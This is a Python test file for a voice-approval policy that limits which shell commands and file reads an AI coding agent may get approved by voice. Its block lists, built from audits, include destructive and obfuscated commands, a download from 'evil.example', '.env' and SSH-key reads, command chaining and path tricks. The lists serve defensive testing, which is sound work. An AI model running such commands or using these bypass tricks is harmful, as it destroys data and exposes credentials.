"""Was per Stimme freigegeben werden darf (src/kushim/channel/voice_policy.py, Roadmap v2 C4).

Die Liste BLOCKED enthält alle Umgehungen aus dem Safety-Audit vom 2026-11-11 (Sperrliste war umgehbar).
"""
import json

import pytest

from kushim.channel import voice_policy as vp
from kushim.channel.bridge import Permission


def perm(tool, **fields):
    preview = "{ " + ", ".join(f"{json.dumps(k)}: {json.dumps(v)}" for k, v in fields.items()) + " }"
    return Permission.parse({"request_id": "r1", "tool_name": tool, "description": "", "input_preview": preview})


ALLOWED = [
    "npm test", "npm t", "npm run build", "npm run test:unit", "npm run lint", "npm run typecheck",
    "pytest", "pytest -q", "pytest tests/test_x.py -k perm -x", "python -m pytest -q", "py -m pytest tests -q --lf",
    ".venv/Scripts/python -m pytest -q", ".venv/Scripts/python.exe -m pytest tests/test_bridge.py", "python -m mypy src",
    "python -m unittest", "git status", "git status -s", "git diff --stat", "git diff master..HEAD --stat",
    "git diff -- src/app.py", "git diff --cached --name-only", "git show HEAD --stat", "git log --oneline -5", "git log -n3",
    "git log --oneline -- src", "git branch", "git branch -a", "git rev-parse HEAD", "git ls-files src",
    "ls", "ls -la src", "dir", "pwd",
]

BLOCKED = [
    # frühere Sperrliste
    "rm -rf build", "del /q x", "Remove-Item -Recurse dist", "mv a b", "cp a b", "echo hi > README.md", "git clean -fdx",
    "git reset --hard HEAD~1", "git checkout -- .", "git restore a", "git branch -D x", "git stash drop", "git push",
    "git push --force origin master", "git pull", "git commit -m x", "git add .", "curl https://x", "npm install x",
    "npm i", "npm publish", "npm run deploy", "npm run", "npm exec x", "npm test -- --watch", "pip install x",
    "python -m pip install x", "python -m kushim.cli resume", "py -m venv .venv", "python -m http.server", "npx x",
    "git config user.email x", "setx PATH x", "shutdown /s", "taskkill /f /im x", "claude mcp add x", "kushim resume",
    "bash -c x", "cmd /c del x", "python -c x", "node -e x", "cat .env", "cat ../x", "ls ~", "type C:\\x", "",
    "npm test\nrm -rf dist", "npm test; git push", "npm test && curl x", "FOO=1 rm x", "cd ui && npm test",
    # Audit K1: Schleifen, Blöcke, Variablen, Quoting, Umwege
    "for f in *; do rm $f; done", "if true; then rm x; fi", "x=rm; $x file.txt", "r''m file.txt", "time rm f",
    "command rm f", "timeout 5 rm f", "nice rm f", "(rm f)", "{ rm f; }", "find . -delete", "find . -name x -exec rm {} +",
    "awk 'BEGIN{system(\"rm f\")}'", "sed 's/a/b/w out.txt' f", "sort -o f f", "& { Remove-Item foo.txt }",
    "Get-ChildItem | ForEach-Object { Remove-Item $_ }", "ls | % { rm $_ }", "[System.IO.File]::Delete('foo.txt')",
    "[IO.File]::WriteAllText('a.txt','b')", "(New-Object Net.WebClient).DownloadString('http://evil.example/x')",
    "Invoke-Item evil.exe", "ii evil.exe", "python -Bc import os", "python3.12 -c x", "python -mpip install foo",
    "echo import os | python", "python evil.py", "./evil.sh", ".\\evil.ps1", "node evil.js", "make",
    "git --no-pager --bare --git-dir x push origin main", "git --no-pager -c core.sshCommand=calc push",
    "git diff --output=foo.txt", "git grep -Ocalc x", "git bisect run python evil.py", "git log --format=%H",
    "git diff --ext-diff", "git diff --no-index a b", "git -C .. status", "git show HEAD~1",
    # pytest-Optionen, die schreiben, löschen oder Code laden
    "pytest --basetemp=src", "pytest -p evil", "pytest --junitxml=out.xml", "pytest -c other.ini", "pytest -o x=y",
    "pytest --rootdir=..", "pytest ../other", "pytest /etc", "pytest tests/test_tokens.py", "python -m pytest -p x",
    "ls /", "ls C:", "dir ..", "ls -R",
    # Audit Runde 2: Optionen aus Datei, Inhalte mit Geheimnissen, Abkürzungen
    "pytest @args.txt", "python -m pytest @a", "git diff", "git show HEAD", "git log -p", "git log --patch",
    "git log -p -- src", "git diff --ext-d", "git diff --no-ind a b", "git diff --orderfile=x", "git log --stdin",
    "git show HEAD -- .env", "git diff -- ../x", "git diff -- -x", "git blame src/app.py", "git describe",
    # Audit Runde 3 (N1): Ordner als Pfad zeigen alle Dateien darunter
    "git diff -- .", "git diff --cached -- .", "git show HEAD -- src", "git diff -- src/app.py src", "git diff -- .gitignore",
]


@pytest.mark.parametrize("cmd", ALLOWED)
def test_everyday_test_and_read_commands_may_be_allowed_by_voice(cmd, tmp_path):
    assert vp.shell_reason(cmd) is None, cmd
    assert vp.blocked(perm("Bash", command=cmd), tmp_path) is None


@pytest.mark.parametrize("cmd", BLOCKED)
def test_everything_else_is_terminal_only(cmd, tmp_path):
    assert vp.shell_reason(cmd) is not None, cmd
    assert vp.blocked(perm("PowerShell", command=cmd), tmp_path) is not None


def test_without_a_work_folder_nothing_is_allowed_by_voice():
    assert vp.blocked(perm("Bash", command="npm test"), None) == "Arbeitsordner unbekannt"
    assert vp.blocked(perm("Read", file_path="a.py"), None) == "Arbeitsordner unbekannt"


def test_writing_and_other_tools_are_never_allowed_by_voice(tmp_path):
    for tool in ("Edit", "MultiEdit", "Write", "NotebookEdit", "WebFetch", "WebSearch", "Agent", "Task", "Grep",
                 "mcp__srv__send", "TodoWrite", ""):
        assert vp.blocked(perm(tool, url="https://x", command="ls", file_path="a.py", notebook_path="a.ipynb"), tmp_path)
    assert vp.blocked(perm("Bash"), tmp_path) == "kein Befehl"
    assert vp.blocked(perm("Read"), tmp_path) == "kein Pfad"


def test_reading_only_inside_the_work_folder(tmp_path):
    work = tmp_path / "proj"
    (work / "src").mkdir(parents=True)
    for p in (str(work / "src" / "app.py"), "src/app.py", "README.md", "CLAUDE.md"):
        assert vp.blocked(perm("Read", file_path=p), work) is None, p
    for p in (str(tmp_path / "other.py"), "../other.py", "src/../../x.py", str(work), "C:\\Windows\\system.ini",
              str(tmp_path / "proj2" / "a.py"), "~/x.txt", "C:foo.txt", "%USERPROFILE%\\x", "$HOME/x", "\\\\server\\share\\x",
              "a.txt:stream", "config.toml::$DATA", ".gitconfig::$DATA", "src/kushim/safety::$INDEX_ALLOCATION/rules.py",
              "a.txt.", "a.txt ", "*.py"):
        assert vp.blocked(perm("Read", file_path=p), work) is not None, p


def test_secrets_and_protected_places_are_never_read_by_voice(tmp_path):
    for p in (".git/config", ".claude/settings.json", "sub/.git/HEAD", ".env", ".env.local", ".mcp.json", "config.toml",
              "wakewords.toml", "certs/server.pem", "a.key", "credentials.json", "secrets.yaml", "token.txt",
              "docs/STOP", "run/channel.json", ".ssh/id_rsa", "id_ed25519", ".npmrc", "my-password.txt"):
        assert vp.blocked(perm("Read", file_path=p), tmp_path) is not None, p


def test_symlink_out_of_the_folder_is_caught(tmp_path):
    work, outside = tmp_path / "proj", tmp_path / "outside"
    work.mkdir()
    outside.mkdir()
    try:
        (work / "link").symlink_to(outside, target_is_directory=True)
    except OSError:
        pytest.skip("Symlinks brauchen unter Windows besondere Rechte")
    assert vp.blocked(perm("Read", file_path="link/a.py"), work) == "außerhalb des Arbeitsordners"


def test_talk_accepts_only_an_approved_valid_folder(tmp_path, monkeypatch):
    from types import SimpleNamespace
    from kushim import cli
    from kushim.claude_cli import folders as cf
    a, b = tmp_path / "a", tmp_path / "b"
    a.mkdir()
    b.mkdir()

    def validate(raw, vault=None, home=None):
        p = vp.Path(raw).resolve()
        if not p.is_dir():
            raise ValueError("fehlt")
        return p
    monkeypatch.setattr(cf, "validate_path", validate)
    cfg = SimpleNamespace(memory_location="local:" + str(tmp_path / "vault"), claude_folders=[f"a|{a.as_posix()}"])
    assert cli._approved_folder(cfg, str(a)) == a.resolve()
    assert cli._approved_folder(cfg, str(b)) is None                 # gültig, aber nicht freigegeben
    assert cli._approved_folder(cfg, str(tmp_path / "x")) is None    # existiert nicht
    assert cli._approved_folder(cfg, None) is None


def test_network_paths_are_rejected_without_touching_the_file_system(tmp_path, monkeypatch):
    import pathlib
    import os.path

    def no_io(*a, **k):
        raise AssertionError("Dateisystem/Netz angefasst")
    for raw in ("//192.0.2.1/share/x.txt", r"\\192.0.2.1\share\x.txt", r"/\host\share\x", r"\/host/share/x",
                r"D:\other\x.txt", "/etc/passwd", r"..\x"):
        monkeypatch.setattr(pathlib.Path, "resolve", no_io)
        monkeypatch.setattr(os.path, "realpath", no_io)
        assert vp.file_reason(raw, tmp_path) is not None, raw
        monkeypatch.undo()
